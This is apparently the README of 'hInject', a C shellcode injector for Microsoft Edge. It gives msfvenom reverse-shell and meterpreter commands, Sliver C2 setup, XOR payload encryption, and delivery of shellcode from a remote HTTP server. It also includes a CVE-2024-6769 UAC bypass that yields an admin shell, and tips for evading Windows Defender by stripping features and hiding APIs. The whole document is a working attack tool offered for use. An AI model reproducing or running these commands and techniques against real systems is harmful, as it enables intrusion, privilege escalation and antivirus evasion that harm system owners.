# hInject

**hInject** is a shellcode injector written in C, designed to inject payloads into Microsoft Edge. It is not primarily intended to bypass antivirus (AV) solutions but includes workarounds like hiding Windows APIs in the Import Address Table (IAT) using API hashing tactics.

## Features

**hInject** supports multiple shellcode delivery methods:
- **Embedded Resources**: Shellcode is embedded in the `.rsc` section of the binary.
- **Local Named Pipe**: Retrieves shellcode from a hardcoded named pipe, useful for scenarios like inter-beacon communication (e.g., grabbing shellcode from a running beacon).
- **HTTP Method**: Fetches shellcode from a remote HTTP server.
- **HEX**: Reads shellcode as hex from stdin. Note: This method does not work with the `--elevate` flag for UAC bypass due to the large size of Donut-generated shellcode.

## UAC Bypass

**hInject** includes a UAC bypass implementation for **CVE-2024-6769**, based on [fortra/CVE-2024-6769](https://github.com/fortra/CVE-2024-6769). The bypass is converted into position-independent shellcode using [Donut](https://github.com/TheWover/donut) It can be triggered with the `--elevate` flag. The required DLLs & trigger shellcode can be pulled from a remote server. Note that the bypass is not guaranteed to work and may require administrative privileges in some cases.

For details, see the [fortra/CVE-2024-6769](https://github.com/fortra/CVE-2024-6769) repository.

## Anti-Virus Evasion Tips

**hInject** is designed to be modular and easy to modify:
- **Remove Unneeded Features**: Strip out the HTTP method if using only resource-based payloads to reduce detectability.
- **Minimize Resources**: Comment out resource-related code to reduce the `.rsc` section size and entropy, which may help evade Windows Defender.
- **Remote UAC Bypass**: Remove the embedded UAC bypass resource and pull it from an HTTP server to further minimize entropy.

In testing, **hInject** performed well against Windows Defender on a Windows 11 VM with Defender enabled, as shown in the demos below.

## Testing Environment

The tests were conducted on a Windows 11 VM with Microsoft Defender enabled.

### System Information
```powershell
systeminfo | findstr /B /C:"Host Name" /C:"Os Name" /C:"Os Version"
```
<img width="869" height="88" alt="Pasted image 20250829230114" src="https://github.com/user-attachments/assets/eca41c15-91df-4461-912d-d08b2bfc260d" />


### Defender Features Status
```powershell
Get-MpComputerStatus | Select-Object AMServiceEnabled, AntispywareEnabled, AntivirusEnabled, BehaviorMonitorEnabled, IoavProtectionEnabled, OnAccessProtectionEnabled, RealTimeProtectionEnabled, NISEnabled
```
<img width="1862" height="205" alt="Pasted image 20250829230528" src="https://github.com/user-attachments/assets/435c70ce-e101-4cba-886f-3161b0bbcdcb" />


### Static Analysis
The compiled **hInject** binary passed initial static checks by Windows Defender in a Windows 11 VM. Defender uploads files to the cloud for 10 seconds, but no threats were detected. Using `rasta-mouse`'s [ThreatCheck tool](https://github.com/rasta-mouse/ThreatCheck), no bad bytes triggered static detection.
<img width="1561" height="91" alt="Pasted image 20250830011113" src="https://github.com/user-attachments/assets/1c1738ae-ed91-4562-9c7c-84dad0ea40e1" />


IAT analysis with [PEStudio](https://www.winitor.com/download) shows 17 flags related to `wininet.dll` and `WS2_32.dll`, as these APIs were not hashed. The `wininet.dll` is used for proxying socket calls so i found it hard to hash each API name and parse it manualy from a specific DLL cause they linked from diffrent places & when ever i tried this approch i got some confusion with old socket structures includes in standard windows header. I was able to create kinda custom socket implementation i created, see [winnet-sockets](https://gist.github.com/Abdelhadi963/ee38afefc04ace04be76839357dcabde) but i didn't got much time to use it in the injector might be for the next injector.

<img width="1612" height="607" alt="Pasted image 20250829231743" src="https://github.com/user-attachments/assets/e3f6d24b-900d-4470-9d19-e6f23f830d98" />


No critical APIs like `CreateRemoteThread`, `VirtualAlloc`, or `WriteProcessMemory` appear in the IAT. Functions like `GetCurrentThreadId` and `GetCurrentProcessId` are included by the C linker for some internal functions, not injection. To eliminate these flags, remove the HTTP method and modify `inject.c` and `parser.h` as shown here:
- [inject.c](https://gist.github.com/Abdelhadi963/16a51e4d938269b6ae271a0ce834fe45)
- [parser.h](https://gist.github.com/Abdelhadi963/5561a581788a29e460c63bab884efa1a)

After rebuilding, only three default flags remain, and the binary retains named pipe, hex, and resource-based injection capabilities.

<img width="1417" height="764" alt="Pasted image 20250829235744" src="https://github.com/user-attachments/assets/1c87356b-f684-4b3c-928b-212acfbd6f90" />


## Usage and Testing

Below are examples of using each injection method. The help menu is shown here:

<img width="1423" height="699" alt="Pasted image 20250830001234" src="https://github.com/user-attachments/assets/85c6f021-19cb-46b0-9e7f-576338ee9314" />


> **Note**: The default method uses embedded resources. The process works for both HTTP-less and HTTP-enabled versions.

### Resource Method

1. Generate shellcode using `msfvenom`:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.136.181 LPORT=443 -f raw -o shellcode.bin
```

2. Encrypt the shellcode using `parser_tool.py` from sources folder with a hardcoded XOR key (modify as needed):
```bash
python parser_tool.py --file shellcode.bin --xor-key ippyokai --binout coffe.bin
```
<img width="1224" height="97" alt="Pasted image 20250830010524" src="https://github.com/user-attachments/assets/2adc1e59-fdab-4d2a-99c1-6bd9be2bd86a" />

3. Embed the shellcode as a resource:
   - In Visual Studio, import the encrypted file (`coffe.bin`) as a resource named `COFFE` (or update `core.h`, `resource.h`, and `hInject.rc` if using a different name).
   - Rebuild the solution.

<img width="968" height="662" alt="Pasted image 20250830001732" src="https://github.com/user-attachments/assets/14348175-4b3d-4561-9ba1-d75aba9c30fa" />
<img width="933" height="617" alt="Pasted image 20250830002230" src="https://github.com/user-attachments/assets/0682d835-df2e-4bce-b594-f0e112d15a38" />

4. Run the resource method:
```bash
.\hInject.exe -m resource
```
<img width="1110" height="472" alt="Pasted image 20250830012038" src="https://github.com/user-attachments/assets/25f3ca2a-6c19-48b5-ab69-7ba312d7b903" />

The reverse shell was successfully obtained in a Commando VM:
<img width="959" height="239" alt="Pasted image 20250830012112" src="https://github.com/user-attachments/assets/61f1bbb0-1fd5-4743-a564-36fe261fc62a" />


### HEX Method

This example uses a Meterpreter shellcode as a staged payload for Sliver C2.

1. Generate shellcode:
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.136.138 LPORT=4444 -f raw -o shellcode.bin
```

2. Set up Sliver:
```bash
profiles new beacon --mtls 192.168.136.138:4444 --format shellcode hInject
stage-listener -u tcp://192.168.136.138:4444 -p hInject
mtls -L 192.168.136.128 -l 443
```

3. Convert shellcode to hex using `parser_tool.py`:
```bash
python3 parser_tool.py --file shellcode.bin --xor-key ippyokai --hexshellcode
```
<img width="1841" height="227" alt="Pasted image 20250830015601" src="https://github.com/user-attachments/assets/cc29642f-12c8-4272-9a8e-df0c3613616c" />

4. Run the HEX method:
```bash
.\hInject.exe -m hex <hex_payload>
```
<img width="1320" height="477" alt="Pasted image 20250830015709" src="https://github.com/user-attachments/assets/db8ae6a0-2a13-4362-af93-a2983ed1a621" />

The beacon callback was successful, and Windows Defender did not block the process:
<img width="1462" height="865" alt="Pasted image 20250830015942" src="https://github.com/user-attachments/assets/c3b01061-1678-4be7-b42e-ec0c7dca1dfb" />


### Named Pipe Method

This method simulates inter-beacon communication by serving shellcode via a named pipe using the included `PipeServer` project.

1. Generate a C array from the shellcode:
```bash
python3 parser_tool.py --file shellcode.bin --xor-key ippyokai --carray --carray-out shellcode.c
```

2. Add the C array to the `PipeServer` project and rebuild.

3. Run `PipeServer` and `hInject`:
<img width="1611" height="468" alt="Pasted image 20250830022508" src="https://github.com/user-attachments/assets/80971569-b310-4f05-b537-efd9b96d3216" />

The beacon callback was successful:
<img width="1607" height="801" alt="Pasted image 20250830022558" src="https://github.com/user-attachments/assets/5781d520-bd36-40d7-a304-5f4ed5f507fe" />


### HTTP Method

This uses the full version of **hInject** with HTTP support.

1. Run the HTTP method:
```bash
.\hInject.exe -m http -i 192.168.136.138 -p 80 -f /shellcode.bin
```
<img width="1315" height="372" alt="Pasted image 20250830024322" src="https://github.com/user-attachments/assets/5b9abb8f-5769-4c75-8e84-682e26c17c48" />

The reverse shell was obtained, running as a non-elevated process (`whoami /priv` confirms):
<img width="1614" height="838" alt="Pasted image 20250830024203" src="https://github.com/user-attachments/assets/5c24ed1c-0b60-4c4b-b0f2-f6e809550d32" />


### UAC Bypass

> **Note**: The UAC bypass uses ALPC to register a new entry for `tapi32.dll` in the SxS assembly cache, which can be unreliable and may require administrative privileges. If it fails, consider replacing or removing it.

The UAC bypass is based on [fortra/CVE-2024-6769](https://github.com/fortra/CVE-2024-6769). The `uactrigger.exe` was reimplemented but i used the same`MsCtfMonitor.dll` patched just the message box popup using IDA with nop instructions. The bypass injects a custom `imm32.dll` containing encrypted shellcode into `msedge`.

#### Elevation Steps

1. Generate shellcode from `uactrigger.exe` using Donut:
```bash
./donut -a 2 -f 1 -o daijin.bin -i uactrigger.exe
```
<img width="994" height="329" alt="Pasted image 20250830030833" src="https://github.com/user-attachments/assets/177df7d7-3117-49aa-983c-fdafbe8e3115" />

2. Encrypt the shellcode:
```bash
python3 parser_tool.py -f daijin.bin --xor-key ippyokai --binout uac.bin
```

3. Embed the shellcode as a resource named `SUZUME` (or update `resource.h` and `hInject.rc` if using a different name) or serve it from an HTTP server using the `--reuse` flag to reuse the sane http server for the shellcode as i did.

> **Note**: Avoid embedding Donut-generated shellcode directly, as it may increase detectability due to its size and entropy.

4. Generate and embed a reverse shell shellcode in the `uac.c` file (in the `uac` project) as an embedded resource.

5. Run the UAC bypass:
```bash
.\hInject.exe -m http -i 192.168.136.138 -p 80 -f /uac.bin --elevate --reuse --tapi32-manifest TAPI32.Manifest --injector MsCtfMonitor.dll --payload uac.dll
```
<img width="1699" height="787" alt="Pasted image 20250830075505" src="https://github.com/user-attachments/assets/ba43b187-272b-4581-9c94-1fc3c57799c6" />

The `TCMSTUP.exe` process loads `tapi32.dll`, which in turn loads the custom `imm32.dll`. If the activation context fails, it may load the default `imm32.dll` from `C:\Windows\System32`, causing the exploit to fail. Verify the loaded DLL using Process Explorer:

<img width="1672" height="577" alt="Pasted image 20250830080410" src="https://github.com/user-attachments/assets/baf31098-f746-45d9-be3f-a301b5e15a28" />

A successful bypass results in a shell with high integrity level and full administrative privileges:

<img width="1678" height="960" alt="Pasted image 20250830080510" src="https://github.com/user-attachments/assets/dfbdb799-823f-42dc-9ff2-17aaa5c641e5" />

### Named Pipe Method with UAC Bypass

The named pipe method works similarly. Provide the IP and port of the server hosting the necessary DLLs and place the Donut-generated trigger shellcode in the `PipeServer` project.

## Future Improvements

Future versions of **hInject** may include a native API shellcode injector for enhanced functionality. Contributions and custom delivery methods are welcome!

